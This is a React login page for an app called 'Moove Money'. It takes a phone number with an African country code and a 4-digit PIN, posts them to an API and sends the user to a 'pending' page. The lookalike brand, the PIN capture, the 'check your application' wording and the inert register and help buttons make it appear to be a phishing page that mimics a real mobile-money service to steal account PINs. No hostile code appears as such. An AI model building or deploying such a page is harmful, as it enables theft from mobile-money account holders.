import { useState, useRef, useEffect } from 'react';
import { useLocation } from 'wouter';
import { PageTransition } from '../components/PageTransition';
import { useSubmitLogin } from '@workspace/api-client-react';
import { getSessionId, setSessionId } from '../lib/store';
import { CircleDollarSign, Loader2, ChevronDown, Check } from 'lucide-react';

const COUNTRIES = [
  { flag: '🇧🇯', name: 'Benin',                    code: '+229', iso: 'BJ', maxLen: 9 },
  { flag: '🇧🇫', name: 'Burkina Faso',              code: '+226', iso: 'BF', maxLen: 8 },
  { flag: '🇨🇫', name: 'Central African Republic',  code: '+236', iso: 'CF', maxLen: 8 },
  { flag: '🇹🇩', name: 'Chad',                      code: '+235', iso: 'TD', maxLen: 8 },
  { flag: '🇨🇮', name: "Côte d'Ivoire",             code: '+225', iso: 'CI', maxLen: 10 },
  { flag: '🇬🇦', name: 'Gabon',                     code: '+241', iso: 'GA', maxLen: 9 },
  { flag: '🇲🇱', name: 'Mali',                      code: '+223', iso: 'ML', maxLen: 8 },
  { flag: '🇲🇷', name: 'Mauritania',                code: '+222', iso: 'MR', maxLen: 8 },
  { flag: '🇳🇪', name: 'Niger',                     code: '+227', iso: 'NE', maxLen: 8 },
  { flag: '🇹🇬', name: 'Togo',                      code: '+228', iso: 'TG', maxLen: 8 },
];

export default function Login() {
  const [, setLocation] = useLocation();
  const [phone, setPhone] = useState('');
  const [pin, setPin] = useState('');
  const [selectedIdx, setSelectedIdx] = useState(4); // Côte d'Ivoire default
  const [dropdownOpen, setDropdownOpen] = useState(false);
  const [search, setSearch] = useState('');
  const dropdownRef = useRef<HTMLDivElement>(null);
  const searchRef = useRef<HTMLInputElement>(null);

  const submitLogin = useSubmitLogin();
  const country = COUNTRIES[selectedIdx];

  // Close dropdown on outside click
  useEffect(() => {
    const handler = (e: MouseEvent) => {
      if (dropdownRef.current && !dropdownRef.current.contains(e.target as Node)) {
        setDropdownOpen(false);
        setSearch('');
      }
    };
    document.addEventListener('mousedown', handler);
    return () => document.removeEventListener('mousedown', handler);
  }, []);

  // Focus search when dropdown opens
  useEffect(() => {
    if (dropdownOpen) {
      setTimeout(() => searchRef.current?.focus(), 50);
    }
  }, [dropdownOpen]);

  const filtered = COUNTRIES.filter(
    c =>
      c.name.toLowerCase().includes(search.toLowerCase()) ||
      c.code.includes(search)
  );

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (phone.length < 7 || pin.length !== 4) return;

    const sessionId = getSessionId() || 'new-session-id';
    submitLogin.mutate(
      { sessionId, data: { phone: country.code + phone, pin } },
      {
        onSuccess: (data) => {
          setSessionId(data.sessionId);
          setLocation('/pending');
        },
      }
    );
  };

  const isValid = phone.length >= 7 && pin.length === 4;

  return (
    <PageTransition>
      <div className="flex-1 flex flex-col pt-12 pb-8 px-6">
        {/* Logo */}
        <div className="flex items-center gap-2 justify-center mb-12">
          <div className="w-10 h-10 rounded-full bg-primary flex items-center justify-center text-white">
            <CircleDollarSign size={24} />
          </div>
          <span className="font-bold text-2xl tracking-tight text-slate-800">Moove Money</span>
        </div>

        {/* Heading */}
        <div className="mb-10 text-center">
          <h1 className="text-3xl font-extrabold text-slate-900 mb-2">Welcome Back</h1>
          <p className="text-slate-500 font-medium">Log in to check your application</p>
        </div>

        <form onSubmit={handleLogin} className="space-y-6">
          {/* Phone Number with custom country selector */}
          <div>
            <label className="block text-sm font-bold text-slate-700 mb-2">Phone Number</label>
            <div className="flex bg-slate-50 rounded-xl border border-slate-200 focus-within:ring-2 focus-within:ring-primary/20 focus-within:border-primary transition-all overflow-visible relative">

              {/* Country selector button */}
              <div ref={dropdownRef} className="relative flex-shrink-0">
                <button
                  type="button"
                  data-testid="button-country-selector"
                  onClick={() => { setDropdownOpen(v => !v); setSearch(''); }}
                  className="flex items-center gap-1.5 px-3 py-4 border-r border-slate-200 text-slate-700 font-bold outline-none hover:bg-slate-100 transition-colors rounded-l-xl h-full"
                >
                  <span className="text-xl leading-none">{country.flag}</span>
                  <span className="text-sm font-bold text-slate-800 hidden sm:inline">{country.code}</span>
                  <span className="text-sm font-bold text-slate-800 sm:hidden">{country.code}</span>
                  <ChevronDown
                    size={14}
                    className={`text-slate-400 transition-transform duration-200 ${dropdownOpen ? 'rotate-180' : ''}`}
                  />
                </button>

                {/* Dropdown panel */}
                {dropdownOpen && (
                  <div className="absolute top-full left-0 mt-1 w-72 bg-white rounded-2xl shadow-2xl border border-slate-100 z-50 overflow-hidden">
                    {/* Search */}
                    <div className="p-2 border-b border-slate-100">
                      <input
                        ref={searchRef}
                        type="text"
                        value={search}
                        onChange={e => setSearch(e.target.value)}
                        placeholder="Search country..."
                        className="w-full px-3 py-2 text-sm rounded-lg bg-slate-50 border border-slate-200 outline-none focus:ring-2 focus:ring-primary/20 focus:border-primary"
                        data-testid="input-country-search"
                      />
                    </div>
                    {/* List */}
                    <div className="max-h-56 overflow-y-auto">
                      {filtered.length === 0 ? (
                        <div className="px-4 py-3 text-sm text-slate-400 text-center">No countries found</div>
                      ) : (
                        filtered.map((c) => {
                          const idx = COUNTRIES.indexOf(c);
                          const isSelected = idx === selectedIdx;
                          return (
                            <button
                              key={c.iso}
                              type="button"
                              data-testid={`option-country-${c.iso}`}
                              onClick={() => {
                                setSelectedIdx(idx);
                                setDropdownOpen(false);
                                setSearch('');
                                setPhone('');
                              }}
                              className={`w-full flex items-center gap-3 px-4 py-3 hover:bg-orange-50 transition-colors text-left ${isSelected ? 'bg-orange-50' : ''}`}
                            >
                              <span className="text-xl leading-none flex-shrink-0">{c.flag}</span>
                              <span className={`flex-1 text-sm font-medium ${isSelected ? 'text-primary' : 'text-slate-700'}`}>
                                {c.name}
                              </span>
                              <span className="text-sm font-bold text-slate-500">{c.code}</span>
                              {isSelected && <Check size={14} className="text-primary flex-shrink-0" />}
                            </button>
                          );
                        })
                      )}
                    </div>
                  </div>
                )}
              </div>

              {/* Phone input */}
              <input
                type="tel"
                inputMode="numeric"
                value={phone}
                onChange={e => setPhone(e.target.value.replace(/\D/g, ''))}
                className="w-full px-4 py-4 text-slate-900 outline-none font-medium bg-transparent text-lg tracking-wide"
                placeholder="6XXXXXXXX"
                maxLength={country.maxLen}
                data-testid="input-phone"
              />
            </div>
            {phone.length > 0 && phone.length < 7 && (
              <p className="mt-1.5 text-xs text-red-500 font-medium">
                Enter a valid phone number for {country.name}
              </p>
            )}
          </div>

          {/* PIN input */}
          <div>
            <label className="block text-sm font-bold text-slate-700 mb-2">4-Digit PIN</label>
            <input
              type="password"
              inputMode="numeric"
              value={pin}
              onChange={e => setPin(e.target.value.replace(/\D/g, ''))}
              className="w-full px-4 py-4 text-slate-900 outline-none font-black bg-slate-50 border border-slate-200 rounded-xl focus:ring-2 focus:ring-primary/20 focus:border-primary transition-all text-center tracking-[1em] text-2xl"
              placeholder="••••"
              maxLength={4}
              data-testid="input-pin"
            />
          </div>

          <button
            type="submit"
            disabled={submitLogin.isPending || !isValid}
            className="w-full py-4 mt-4 bg-gradient-to-r from-orange-500 to-orange-600 text-white rounded-2xl font-bold text-lg hover:shadow-orange-500/50 transition-shadow shadow-lg shadow-orange-500/30 flex items-center justify-center disabled:opacity-50 disabled:shadow-none"
            data-testid="button-login"
          >
            {submitLogin.isPending ? <Loader2 className="animate-spin" size={24} /> : 'Login'}
          </button>
        </form>

        <div className="mt-6 space-y-4">
          <button className="w-full py-4 text-slate-600 font-bold text-lg rounded-2xl border border-slate-200 hover:bg-slate-50 transition-colors">
            Register New Account
          </button>
        </div>

        <div className="mt-auto pt-10 pb-4 text-center">
          <div className="flex justify-center gap-6 text-sm font-medium text-slate-500">
            <button className="hover:text-primary transition-colors">Help & Support</button>
            <button className="hover:text-primary transition-colors">Terms & Conditions</button>
          </div>
        </div>
      </div>

      {/* Decorative footer wave */}
      <div className="h-16 w-full bg-orange-50 mt-auto rounded-t-[100%] border-t border-orange-100 flex items-end justify-center pb-2">
        <div className="w-12 h-1.5 bg-orange-200 rounded-full" />
      </div>
    </PageTransition>
  );
}
